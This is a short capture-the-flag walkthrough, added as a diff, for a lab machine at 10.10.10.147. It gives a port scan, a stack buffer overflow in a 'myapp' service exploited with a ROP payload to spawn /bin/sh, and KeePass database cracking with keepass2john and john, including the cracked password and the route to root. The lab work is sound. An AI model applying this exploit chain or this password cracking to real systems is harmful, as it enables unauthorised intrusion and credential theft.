@@ -1,0 +1,54 @@
+User Shell:
+using nmap or view source page at 10.10.10.147
+u'll find out that there's a 'myapp' service program on 10.10.10.147:1337
+> nmap -p- -v -o nmap_verbosity.txt 10.10.10.147
+
+then, download myapp
+analized it by IDA.
+vuln at get(), the char[112] will be overflow.
+and the system call needs rdi(address of string) to trigger
+so, the payload looks like this:
+> payload = padding.encode() + p64(pop_r13_r14_r15_ret) + p64(in_main_system) + null + null + p64(mov_rsp_to_rdi_jmp13) + bin_sh
+can look at myapp_exploit.py to check out details
+pop r13 for the mov rdi, rsp in test function.
+pop 14, r15 just use null
+then ret to system in main.
+the rsp is now /bin/sh
+mov rdi, rsp
+jmp r13
+trigger the user shell
+using ssh-keygen as IPPSec did to get a better-look shell.
+
+================================================================================
+
+Root Shell:
+
+Download all files at /home/user
+keepass2john put key(IMG files) and data(MyPasswords.kdbx) together to make hashes:
+> keepass2john -k IMG_0545.JPG MyPasswords.kdbx >> first.txt
+> keepass2john -k IMG_0546.JPG MyPasswords.kdbx >> second.txt
+> keepass2john -k IMG_0547.JPG MyPasswords.kdbx >> third.txt
+> keepass2john -k IMG_0548.JPG MyPasswords.kdbx >> forth.txt
+> keepass2john -k IMG_0552.JPG MyPasswords.kdbx >> fiveth.txt
+> keepass2john -k IMG_0553.JPG MyPasswords.kdbx >> sixth.txt
+
+Then, brute force via john the ripper, found out that the IMG_0547.JPG is the key we want.
+> john --wordlist=/root/rockyou.txt third.txt
+
+Using default input encoding: UTF-8
+Loaded 1 password hash (KeePass [SHA256 AES 32/64])
+Cost 1 (iteration count) is 60000 for all loaded hashes
+Cost 2 (version) is 2 for all loaded hashes
+Cost 3 (algorithm [0=AES, 1=TwoFish, 2=ChaCha]) is 0 for all loaded hashes
+Press 'q' or Ctrl-C to abort, almost any other key for status
+bullshit         (MyPasswords)
+1g 0:00:00:12 DONE (2019-10-28 05:46) 0.07905g/s 79.76p/s 79.76c/s 79.76C/s bullshit
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+
+>> get password 'bullshit'
+
+Install Keepass in windows, using passwd 'bullshit' and the key IMG_0547.JPG
+
+We can open the data base and copy the root password.
+login as user user, su and paste the passwd, rooted.
